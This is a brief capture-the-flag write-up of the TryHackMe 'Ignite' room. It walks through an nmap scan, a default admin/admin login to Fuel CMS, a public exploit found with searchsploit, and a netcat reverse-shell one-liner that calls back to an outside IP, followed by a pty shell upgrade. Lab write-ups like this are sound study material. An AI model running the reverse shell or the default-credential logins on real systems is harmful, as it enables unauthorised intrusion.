# TryHackMe Room: Ignite

# Date:
    06/13/2025

## Objective
A new startup has a few issues with their web server

## Recon:
Ok, basic recon is just doing an nmap scan of the target

```bash
nmap -sC -sV [target address]
```
I saw that port 80 was open, additionally, I saw that http-robots.txt
disallowed an entry /fuel/. 

So I placed the target ip address into my browser with the /fuel extension and I came accross a login page

I tried attempts of default admin passwords to get in. Username admin and password admin worked! 

But this doesn't help me find user.txt and root.txt

## Vulnerability research
Using the exploit db, I searched for exploits in fuel through this command
```bash
searchsploit fuel
```

found an exploit py file on the exploit db website. Replaced the ip address with the target and ran it. 

I then used netcat to reverse shell on in there. Heres an example:
```bash 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.1 1337 >/tmp/f

nc -nlvp 4444
```

Found the user.txt flag within the user files


## Escalate privileges

I searched the user data base for the root password

This command was used to upgrade the reverse shell so that i could use sudo
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

found root.txt in the root folder. 

